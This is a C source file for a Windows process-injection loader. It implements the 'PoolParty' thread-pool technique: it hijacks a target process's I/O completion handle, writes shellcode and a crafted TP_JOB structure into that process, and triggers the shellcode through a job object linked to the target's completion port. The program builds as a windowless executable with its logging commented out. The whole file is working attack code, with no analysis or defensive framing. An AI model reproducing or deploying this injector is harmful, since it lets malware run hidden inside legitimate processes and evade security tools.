﻿#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#include <windows.h>
#include "PPloader.h"


HANDLE m_p_hIoCompletion = NULL;
#define JOB_NAME_LENGTH 8
unsigned char POOL_PARTY_JOB_NAME[JOB_NAME_LENGTH + 1];

HANDLE HijackIoCompletionProcessHandle(HANDLE p_hTarget) {
	return HijackProcessHandle((PWSTR)L"IoCompletion\0", p_hTarget, IO_COMPLETION_ALL_ACCESS);
}

HANDLE GetTargetThreadPoolIoCompletionHandle() {
	HANDLE p_hIoCompletion = HijackIoCompletionProcessHandle(m_p_hTargetPid);
	//printf("[INFO]   Hijacked I/O completion handle from the target process: %x", p_hIoCompletion);
	return p_hIoCompletion;
}

char generateRandomLetter() {
	int randomNumber = rand() % 26;
	char randomLetter = 'A' + randomNumber;
	return randomLetter;
}

void RemoteTpJobInsertionSetupExecution() {
	srand((unsigned int)time(NULL));
	for (int i = 0; i < JOB_NAME_LENGTH; ++i) {
		POOL_PARTY_JOB_NAME[i] = generateRandomLetter();
	}
	POOL_PARTY_JOB_NAME[JOB_NAME_LENGTH] = '\0';

	_TpAllocJobNotification TpAllocJobNotification = (_TpAllocJobNotification)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpAllocJobNotification"));
	HANDLE p_hJob = CreateJobObjectA(NULL, POOL_PARTY_JOB_NAME);
	if (p_hJob == NULL) {
		//printf("[INFO] 	Failed to create job object with name %s", POOL_PARTY_JOB_NAME);
		return;
	}
	//printf("[INFO] 	Created job object with name `%s`", POOL_PARTY_JOB_NAME);

	PFULL_TP_JOB pTpJob = { 0 };
	NTSTATUS Ntstatus = TpAllocJobNotification(&pTpJob, p_hJob, m_ShellcodeAddress, NULL, NULL);
	if (!NT_SUCCESS(Ntstatus)) {
		//printf("[INFO] 	TpAllocJobNotification Failed!");
		return;
	}
	//printf("[INFO] 	Created TP_JOB structure associated with the shellcode");


	PFULL_TP_JOB RemoteTpJobAddress = (PFULL_TP_JOB)(VirtualAllocEx(m_p_hTargetPid, NULL, sizeof(FULL_TP_JOB), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	//printf("[INFO] 	Allocated TP_JOB memory in the target process: %p", RemoteTpJobAddress);
	WriteProcessMemory(m_p_hTargetPid, RemoteTpJobAddress, pTpJob, sizeof(FULL_TP_JOB), NULL);
	//printf("[INFO] 	Written the specially crafted TP_JOB structure to the target process");

	JOBOBJECT_ASSOCIATE_COMPLETION_PORT JobAssociateCopmletionPort = { 0 };
	SetInformationJobObject(p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
	//printf("[INFO] 	Zeroed out job object `%s` IO completion port", POOL_PARTY_JOB_NAME);

	JobAssociateCopmletionPort.CompletionKey = RemoteTpJobAddress;
	JobAssociateCopmletionPort.CompletionPort = m_p_hIoCompletion;
	SetInformationJobObject(p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
	//printf("[INFO] 	Associated job object `%s` with the IO completion port of the target process worker factory", POOL_PARTY_JOB_NAME);

	AssignProcessToJobObject(p_hJob, GetCurrentProcess());
	//printf("[INFO] 	Assigned current process to job object `%s` to queue a packet to the IO completion port of the target process worker factory", POOL_PARTY_JOB_NAME);
}

void HijackHandles() {
	m_p_hIoCompletion = GetTargetThreadPoolIoCompletionHandle();
}

void Inject() {
	////printf("[INFO] 	Starting PoolParty attack against process id: %d", m_dwTargetPid);
	m_p_hTargetPid = GetTargetProcessHandle();
	if (m_p_hTargetPid == NULL) {
		//printf( "[INFO] 	Cannot Open Process!");
		return;
	}
	HijackHandles();
	m_ShellcodeAddress = AllocateShellcodeMemory();
	if (m_ShellcodeAddress == NULL) {
		//printf( "[INFO] 	AllocateShellcodeMemory Failed!");
		return;
	}
	if (!WriteShellcode()) {
		//printf( "[INFO] 	WriteShellcode Failed!");
		return;
	}
	RemoteTpJobInsertionSetupExecution();
	//printf("[INFO] 	PoolParty attack completed.");
}

int main()
{
	Inject();
	////printf("m_p_hTargetPid,%x m_dwTargetPid%x,m_ShellcodeAddress%x", m_p_hTargetPid, m_dwTargetPid, m_ShellcodeAddress);
}
